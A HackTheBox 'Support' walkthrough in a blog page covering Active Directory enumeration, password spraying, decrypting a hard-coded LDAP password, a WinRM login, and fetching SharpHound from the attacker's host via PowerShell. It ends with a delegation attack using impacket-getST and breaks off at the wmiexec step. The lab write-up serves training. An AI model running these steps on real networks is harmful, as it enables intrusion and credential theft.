@@ -1,0 +1,478 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Support</title><meta name="description" content="This is a blog created by ischyrós"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/faviconn.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+Information Gathering~/.profilemkt() &amp;#123;
+        mkdir &amp;#123;nmap,exploits,tmp,content&amp;#125;
+&amp;#125;
+
+function extractPorts()&amp;#123;
+        ports=&amp;quot;$(cat $1 | grep -oP &amp;#39;\d&amp;#123;1,5&amp;#125;/open&amp;#39; | awk &amp;#39;&amp;#123;print $1&amp;#125;&amp;#39; FS=&amp;#39;/&amp;#39; | xargs | tr &amp;#39; &amp;#39; &amp;#39;,&amp;#39;)&amp;quot;
+        ip_address=&amp;quot;$(cat $1 | grep -oP &amp;#39;\d&amp;.."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">ischyrós's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Support</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#profile"><span class="toc-text">~&#x2F;.profile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-53-Default-port-for-DNS"><span class="toc-text">TCP 53 ( Default port for DNS )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-88-Default-port-for-kerberos"><span class="toc-text">TCP 88 ( Default port for kerberos )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-135-Default-port-for-RPC"><span class="toc-text">TCP 135 ( Default port for RPC )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-389-Default-port-for-LDAP"><span class="toc-text">TCP 389 ( Default port for LDAP )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-445-Default-port-for-SMB"><span class="toc-text">TCP 445 ( Default port for SMB )</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information-Gathering-Operating-System"><span class="toc-text">Information Gathering ( Operating System )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Enumeration"><span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Firewall-and-AV-Enumeration"><span class="toc-text">Firewall and AV Enumeration</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Pentesting"><i class="tag post-item-tag">Pentesting</i></a><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Easy"><i class="tag post-item-tag">Easy</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Support</h1><time class="has-text-grey" datetime="2022-09-22T14:19:26.000Z">2022-09-22</time><article class="mt-2 post-content"><img src="/2022/09/22/support/avatar.png" class="">
+
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h3 id="profile"><a href="#profile" class="headerlink" title="~/.profile"></a>~/.profile</h3><pre><code class="bash">mkt() &#123;
+        mkdir &#123;nmap,exploits,tmp,content&#125;
+&#125;
+
+function extractPorts()&#123;
+        ports=&quot;$(cat $1 | grep -oP &#39;\d&#123;1,5&#125;/open&#39; | awk &#39;&#123;print $1&#125;&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&quot;
+        ip_address=&quot;$(cat $1 | grep -oP &#39;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&#39; | sort -u | head -n 1)&quot;
+        echo -e &quot;\n[*] Extracting information...\n&quot; &gt; extractPorts.tmp
+        echo -e &quot;\t[*] IP Address: $ip_address&quot;  &gt;&gt; extractPorts.tmp
+        echo -e &quot;\t[*] Open ports: $ports\n&quot;  &gt;&gt; extractPorts.tmp
+        echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+        echo -e &quot;[*] Ports copied to clipboard\n&quot;  &gt;&gt; extractPorts.tmp
+        cat extractPorts.tmp; rm extractPorts.tmp
+&#125;
+</code></pre>
+<h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><ul>
+<li><p>command used: ( scanning for all the ports fast and efficient)</p>
+<pre><code class="bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.174 -oG nmap/allPorts
+</code></pre>
+</li>
+<li><p>command used: ( scanning the ports we got )</p>
+<pre><code class="bash">nmap -A -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49688,49705,62849 10.10.11.174 -Pn
+</code></pre>
+</li>
+</ul>
+<p>-&gt; All ports scan:</p>
+<pre><code class="bash">Not shown: 65516 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49688/tcp open  unknown          syn-ack ttl 127
+49705/tcp open  unknown          syn-ack ttl 127
+62849/tcp open  unknown          syn-ack ttl 127
+</code></pre>
+<p>-&gt; All ports scan with flags:</p>
+<pre><code class="bash">PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-20 14:49:32Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49688/tcp open  msrpc         Microsoft Windows RPC
+49705/tcp open  msrpc         Microsoft Windows RPC
+62849/tcp open  msrpc         Microsoft Windows RPC
+</code></pre>
+<p>We got the domain name from the nmap scan: <strong>support.htb</strong><br>Let’s add it to our <strong>/etc/hosts</strong> file</p>
+<img src="/2022/09/22/support/20220920175546.png" class="">
+
+<h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><h6 id="TCP-53-Default-port-for-DNS"><a href="#TCP-53-Default-port-for-DNS" class="headerlink" title="TCP 53 ( Default port for DNS )"></a>TCP 53 ( Default port for DNS )</h6><p>-&gt; Enumeration:</p>
+<pre><code class="bash">└─$ dig support.htb                   
+
+; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; support.htb
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 41340
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 4096
+;; QUESTION SECTION:
+;support.htb.                   IN      A
+
+;; AUTHORITY SECTION:
+.                       5       IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2022092000 1800 900 604800 86400
+
+;; Query time: 11 msec
+;; SERVER: 192.168.153.2#53(192.168.153.2) (UDP)
+;; WHEN: Tue Sep 20 11:03:22 EDT 2022
+;; MSG SIZE  rcvd: 115
+</code></pre>
+<p>-&gt; axfr:</p>
+<pre><code class="bash">└─$ dig axfr support.htb @10.10.11.174
+
+; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr support.htb @10.10.11.174
+;; global options: +cmd
+; Transfer failed.
+</code></pre>
+<p>-&gt; DNSrecon:</p>
+<img src="/2022/09/22/support/20220920180612.png" class="">
+
+<h6 id="TCP-88-Default-port-for-kerberos"><a href="#TCP-88-Default-port-for-kerberos" class="headerlink" title="TCP 88 ( Default port for kerberos )"></a>TCP 88 ( Default port for kerberos )</h6><p>-&gt; Username Enumeration:</p>
+<pre><code class="bash">/opt/kerbrute/kerbrute_linux_amd64 userenum --dc 10.10.11.174 -d support.htb xato-net-10-million-usernames.txt
+</code></pre>
+<p>-&gt; Output:</p>
+<pre><code class="bash">    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/20/22 - Ronnie Flathers @ropnop
+
+2022/09/20 11:21:04 &gt;  Using KDC(s):
+2022/09/20 11:21:04 &gt;   10.10.11.174:88
+2022/09/20 11:21:06 &gt;  [+] VALID USERNAME:       support@support.htb
+2022/09/20 11:21:07 &gt;  [+] VALID USERNAME:       guest@support.htb
+2022/09/20 11:21:14 &gt;  [+] VALID USERNAME:       administrator@support.htb
+2022/09/20 11:22:18 &gt;  [+] VALID USERNAME:       Guest@support.htb
+2022/09/20 11:22:18 &gt;  [+] VALID USERNAME:       Administrator@support.htb
+2022/09/20 11:24:33 &gt;  [+] VALID USERNAME:       management@support.htb
+2022/09/20 11:24:54 &gt;  [+] VALID USERNAME:       Support@support.htb
+2022/09/20 11:25:56 &gt;  [+] VALID USERNAME:       GUEST@support.htb
+</code></pre>
+<p>-&gt; Password Spraying:</p>
+<pre><code class="bash">crackmapexec smb 10.10.11.174 -u content/users.txt -p /opt/rockyou.txt
+</code></pre>
+<h6 id="TCP-135-Default-port-for-RPC"><a href="#TCP-135-Default-port-for-RPC" class="headerlink" title="TCP 135 ( Default port for RPC )"></a>TCP 135 ( Default port for RPC )</h6><p>-&gt; RPC Enumeration: <strong>rpclient</strong></p>
+<pre><code class="bash">rpcclient -U &quot;&quot; -N 10.10.11.174
+</code></pre>
+<p>-&gt; Output:</p>
+<pre><code class="bash">rpcclient $&gt; enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $&gt;
+</code></pre>
+<p>-&gt; rpcdump:</p>
+<pre><code class="bash">└─$ python3 /usr/share/doc/python3-impacket/examples/rpcmap.py &#39;ncacn_ip_tcp:10.10.11.174&#39;                    
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Procotol: N/A
+Provider: rpcss.dll
+UUID: 00000136-0000-0000-C000-000000000046 v0.0
+
+Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
+Provider: rpcss.dll
+UUID: 000001A0-0000-0000-C000-000000000046 v0.0
+</code></pre>
+<h6 id="TCP-389-Default-port-for-LDAP"><a href="#TCP-389-Default-port-for-LDAP" class="headerlink" title="TCP 389 ( Default port for LDAP )"></a>TCP 389 ( Default port for LDAP )</h6><p>-&gt; LDAP Enumeration: <strong>ldapsearch</strong></p>
+<pre><code class="bash">└─$ ldapsearch -H ldap://10.10.11.174 -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=support,DC=htb
+namingcontexts: CN=Configuration,DC=support,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=support,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+</code></pre>
+<h6 id="TCP-445-Default-port-for-SMB"><a href="#TCP-445-Default-port-for-SMB" class="headerlink" title="TCP 445 ( Default port for SMB )"></a>TCP 445 ( Default port for SMB )</h6><p>-&gt; SMB Enumeration: <strong>smbclient</strong></p>
+<pre><code class="bash">└─$ smbclient -L \\support.htb -I 10.10.11.174 -N  
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        support-tools   Disk      support staff tools
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+<p>-&gt; smbmap:</p>
+<pre><code class="bash">└─$ smbmap -H 10.10.11.174                         
+[+] IP: 10.10.11.174:445        Name: support.htb
+</code></pre>
+<p>-&gt; enum4linux:</p>
+<pre><code class="bash"> ================================( Getting domain SID for 10.10.11.174 )================================
+                                                                                                                                   
+Domain Name: SUPPORT                                                                                                               
+Domain Sid: S-1-5-21-1677581083-3380853377-188903654
+
+[+] Host is part of a domain (not a workgroup) 
+</code></pre>
+<p>-&gt; support-tools listing:</p>
+<pre><code class="bash">└─$ smbclient //10.10.11.174/support-tools         
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Jul 20 13:01:06 2022
+  ..                                  D        0  Sat May 28 07:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+
+                4026367 blocks of size 4096. 967167 blocks available
+smb: \&gt;
+</code></pre>
+<p>As we can see, we have a file that looks interesting <strong>UserInfo.exe.zip</strong><br>Let’s download it and view it using <strong>dnSpy</strong></p>
+<p>After opening it we can see a strange function</p>
+<img src="/2022/09/22/support/20220920190748.png" class="">
+
+<p>Inside it we can see 2 interesting “strings”</p>
+<img src="/2022/09/22/support/20220920190820.png" class="">
+<p>We have the b64 encoded password and a key<br>On the <strong>getPassword()</strong> function we can see the way it’s implementing it and how we can reverse it</p>
+<img src="/2022/09/22/support/20220920190911.png" class="">
+<p>We will use <strong>python3</strong> in order to reverse the password</p>
+<pre><code class="py">&gt;&gt;&gt; enc_password = b&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;
+&gt;&gt;&gt; key = b&quot;armando&quot;
+&gt;&gt;&gt; import base64
+&gt;&gt;&gt; array = base64.b64decode(enc_password)
+&gt;&gt;&gt; array2 = []
+&gt;&gt;&gt; for i in range(len(array)):
+...     array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))
+&gt;&gt;&gt; print(&quot;&quot;.join(array2))
+-&gt; Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+</code></pre>
+<p>With this password we could enumerate further on <strong>ldap</strong> because we saw that we needed a password in order to retrieve information:</p>
+<pre><code class="bash">ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w &#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39; -b &#39;CN=Users,DC=support,DC=htb&#39;
+</code></pre>
+<p>I sorted for unique things and I found something that looks like a password:</p>
+<img src="/2022/09/22/support/20220922150502.png" class="">
+
+<p>I made a wordlist based on the usernames that we found on <strong>ldap</strong></p>
+<pre><code class="bash">ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w &#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39; -b &#39;CN=Users,DC=support,DC=htb&#39; | grep name | cut -d &#39;:&#39; -f 2 &gt; users.txt
+</code></pre>
+<p>With this list we can try to bruteforce the <strong>wsman</strong> using <strong>crackmapexec</strong></p>
+<pre><code class="bash">crackmapexec winrm 10.10.11.174 -u users.txt -p Ironside47pleasure40Watchful
+</code></pre>
+<img src="/2022/09/22/support/20220922150927.png" class="">
+
+<p>Now in order to connect we need to use: </p>
+<pre><code class="bash">evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
+</code></pre>
+<img src="/2022/09/22/support/20220922151039.png" class="">
+
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h3 id="Information-Gathering-Operating-System"><a href="#Information-Gathering-Operating-System" class="headerlink" title="Information Gathering ( Operating System )"></a>Information Gathering ( Operating System )</h3><p>-&gt; ipconfig:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Documents&gt; ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.10.11.174
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+</code></pre>
+<h3 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h3><p>-&gt; current user privilages:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre>
+<p>-&gt; groups were current user is involved:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</code></pre>
+<p>-&gt; view all users:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; net users
+
+User accounts for \\
+-------------------------------------------------------------------------------
+Administrator            anderson.damian          bardot.mary
+cromwell.gerard          daughtler.mabel          ford.victoria
+Guest                    hernandez.stanley        krbtgt
+langley.lucy             ldap                     levine.leopoldo
+monroe.david             raven.clifton            smith.rosario
+stoll.rachelle           support                  thomas.raphael
+west.laura               wilson.shelby
+The command completed with one or more errors.
+</code></pre>
+<p>-&gt; view members of <strong>Administrator</strong> group:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+The command completed successfully.
+</code></pre>
+<h3 id="Firewall-and-AV-Enumeration"><a href="#Firewall-and-AV-Enumeration" class="headerlink" title="Firewall and AV Enumeration"></a>Firewall and AV Enumeration</h3><p>-&gt; check windows defender:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; sc query windefend - OFF
+</code></pre>
+<p>-&gt; firewall settings:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; netsh advfirewall firewall dump - no firewall settings
+</code></pre>
+<p>-&gt; firewall config:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; netsh firewall show config
+
+Domain profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Domain profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          File and Printer Sharing
+
+Allowed programs configuration for Domain profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Domain profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+Standard profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          File and Printer Sharing
+
+Allowed programs configuration for Standard profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Standard profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Disable
+Connections     = Disable
+
+IMPORTANT: Command executed successfully.
+However, &quot;netsh firewall&quot; is deprecated;
+use &quot;netsh advfirewall firewall&quot; instead.
+For more information on using &quot;netsh advfirewall firewall&quot; commands
+instead of &quot;netsh firewall&quot;, see KB article 947709
+at https://go.microsoft.com/fwlink/?linkid=121488 .
+</code></pre>
+<p>-&gt; get AD name:</p>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\support\Downloads&gt; Get-ADDomain -Current LoggedOnUser
+
+
+AllowedDNSSuffixes                 : &#123;&#125;
+ChildDomains                       : &#123;&#125;
+ComputersContainer                 : CN=Computers,DC=support,DC=htb
+DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
+DistinguishedName                  : DC=support,DC=htb
+DNSRoot                            : support.htb
+DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
+Forest                             : support.htb
+InfrastructureMaster               : dc.support.htb
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : &#123;CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=System,DC=support,DC=htb&#125;
+LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
+ManagedBy                          :
+Name                               : support
+NetBIOSName                        : SUPPORT
+ObjectClass                        : domainDNS
+ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+ParentDomain                       :
+PDCEmulator                        : dc.support.htb
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
+ReadOnlyReplicaDirectoryServers    : &#123;&#125;
+ReplicaDirectoryServers            : &#123;dc.support.htb&#125;
+RIDMaster                          : dc.support.htb
+SubordinateReferences              : &#123;DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb&#125;
+SystemsContainer                   : CN=System,DC=support,DC=htb
+UsersContainer                     : CN=Users,DC=support,DC=htb
+</code></pre>
+<p>Now that we enumerated enough we can launch <strong>SharpHound.ps1</strong> with <strong>BloodHound</strong> to get a better view of the Windows Machine.<br>In order to do that we need to start a local server from where we can download the collector.<br><code>python3 -m http.server 443</code><br>After we started the server we will download it from the attacked machine</p>
+<pre><code class="powershell">(New-Object Net.WebClient).DownloadFile(&quot;http://10.10.14.10:443/SharpHound.ps1&quot;,&quot;C:\Users\support\Downloads\SharpHound.ps1&quot;)
+</code></pre>
+<img src="/2022/09/22/support/20220922160933.png" class="">
+
+<p>Now, I like to use a powershell reverse shell when I’m using <strong>SharpHound</strong>.<br>So in order to do that we will use <strong>nishang</strong> to get a powershell reverse shell:</p>
+<img src="/2022/09/22/support/20220922163207.png" class="">
+
+<p>Reverse Shell:</p>
+<img src="/2022/09/22/support/20220922163229.png" class="">
+
+<p>Now we can execute <strong>SharpHound</strong> and get the <em>loot</em> to view the Windows Machine</p>
+<img src="/2022/09/22/support/20220922163632.png" class="">
+
+<p>In order to download the <strong>loot</strong> we will start a <em>smb server</em> on our local machine so we can upload the <strong>loot</strong> to in and download it</p>
+<img src="/2022/09/22/support/20220922164800.png" class="">
+
+<p>And on the attacked machine:</p>
+<img src="/2022/09/22/support/20220922164821.png" class="">
+
+<p>Now that we have it we just need to import it on <strong>bloodhound</strong></p>
+<img src="/2022/09/22/support/20220922164957.png" class="">
+
+<p>As you can see we have access to <strong>GenericAll</strong></p>
+<img src="/2022/09/22/support/20220922170059.png" class="">
+<p>That means that we can perform a resource based constrained delegation attack.<br>We will need to download <strong>PowerView.ps1</strong> and <strong>PowerMad.ps1</strong> the same way we did with <strong>SharpHound.ps1</strong><br>Now follow the steps:</p>
+<img src="/2022/09/22/support/20220922171017.png" class="">
+
+<p>Now we need to get the <strong>ST</strong> key and we will do that using <strong>impacket</strong>:</p>
+<pre><code class="bash">└─$ /usr/bin/impacket-getST support.htb/fakeuser:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+</code></pre>
+<p>With this ticket we can connect using <strong>wmiexec</strong>:</p>
